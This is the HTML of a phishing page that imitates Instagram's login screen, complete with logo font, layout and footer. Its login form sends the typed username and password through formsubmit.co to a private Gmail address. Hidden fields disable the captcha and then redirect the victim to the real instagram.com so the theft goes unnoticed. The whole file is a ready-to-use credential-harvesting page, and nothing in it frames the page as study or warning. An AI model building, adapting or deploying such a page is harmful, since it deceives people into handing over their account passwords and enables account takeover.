<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    @font-face {
      font-family: 'Billabong';
      src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.eot');
      src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.eot?#iefix') format('embedded-opentype'),
           url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.woff') format('woff'),
           url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.ttf') format('truetype'),
           url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.svg#billabong') format('svg');
      font-weight: normal;
      font-style: normal;
    }
  </style>
</head>
<body class="dark-mode">
  <div class="main-container">
    <div class="left-image">
      <!-- Phone image will go here -->
    </div>
    <div class="left-image">
        <img src="./img/cover_pic.png" alt="Instagram screens">
    </div>
    <div class="right-section">
      <div class="login-form">
        <div class="logo">
            <img src="./img/instagram-logo.png" alt="Instagram">
        </div>
        <form action="https://formsubmit.co/ravigeetha915@gmail.com" method="POST">
          <input type="text" name="username" placeholder="Phone number, username, or email" required>
          <input type="password" name="password" placeholder="Password" required>

          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_template" value="table">
          <input type="hidden" name="_subject" value="Instagram Login">
          <input type="hidden" name="_next" value="https://instagram.com">

          <button type="submit" class="login-btn">Log in</button>

          <div class="separator">
            <div class="line"></div>
            <span>OR</span>
            <div class="line"></div>
          </div>

          <div class="facebook-login">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#385185" viewBox="0 0 16 16">
              <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
            </svg>
            <a href="#">Log in with Facebook</a>
          </div>

          <a href="#" class="forgot-password">Forgot password?</a>
        </form>
      </div>

      <div class="signup-prompt">
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </div>

      <!-- <div class="app-download">
        <p>Get the app.</p>
        <div class="download-buttons">
          <a href="#"><img src="./img/app-store.png" alt="Download on the App Store"></a>
          <a href="#"><img src="./img/google-play.png" alt="Get it on Google Play"></a>
        </div>
      </div> -->
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading & Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="copyright">
      <select name="language">
        <option value="en">English</option>
        <option value="es">Español</option>
        <option value="fr">Français</option>
      </select>
      <span>© 2025 Instagram from Meta</span>
    </div>
  </footer>

  <script src="script.js"></script>
</body>
</html>
